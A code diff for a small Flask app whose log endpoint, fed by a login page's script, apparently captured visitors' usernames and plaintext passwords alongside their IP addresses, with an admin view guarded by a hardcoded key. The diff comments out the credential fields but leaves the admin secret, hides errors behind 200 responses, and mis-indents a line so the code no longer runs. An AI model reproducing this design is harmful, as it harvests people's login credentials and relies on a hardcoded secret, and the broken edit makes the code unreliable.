@@ -17,21 +17,25 @@ def index():
 # ─── Log API (called by the login page JS) ─────────────────────────────────────
 @app.route('/api/log', methods=['POST'])
 def log_event():
-    data = request.get_json()
-    if not data:
-        return jsonify({'error': 'No data'}), 400
-
-    supabase.table('logs').insert({
-        'timestamp': data.get('time', datetime.now().isoformat()),
-        'event':     data.get('event', ''),
-        'source':    data.get('source', 'direct'),
-        'device':    data.get('device', 'unknown'),
-        'username':  data.get('username', ''),
-        'password':  data.get('password', ''),
-        'ip':        request.remote_addr
-    }).execute()
-
-    return jsonify({'status': 'ok'})
+    try:
+        data = request.get_json() or {}
+        
+        log_data = {
+            'timestamp': data.get('time', datetime.now().isoformat()),
+            'source': data.get('source', 'direct'),
+            'ip': request.remote_addr,
+            # 'event': data.get('event', ''),      # commented - column missing
+            # 'device': data.get('device', ''),    # commented - column missing
+            # 'username': data.get('username', ''), # commented for security
+            # 'password': data.get('password', '')  # NEVER store password in logs!
+        }
+        
+        supabase.table('logs').insert(log_data).execute()
+        return jsonify({'status': 'logged'}), 200
+        
+    except Exception as e:
+        print("Logging error:", str(e))
+        return jsonify({'status': 'error'}), 200   # Return 200 so it doesn't break the site
 
 # ─── Admin Dashboard ───────────────────────────────────────────────────────────
 @app.route('/admin')
@@ -40,7 +44,7 @@ def admin():
     if key != 'texas2024':
         return '<h2 style="font-family:Arial;text-align:center;margin-top:100px">Access Denied</h2>', 403
 
-    all_logs = supabase.table('logs').select('*').execute().data
+all_logs = supabase.table('logs').select('*').execute().data
 
     total_visits   = sum(1 for r in all_logs if r['event'] == 'visit')
     total_submits  = sum(1 for r in all_logs if r['event'] == 'submit')
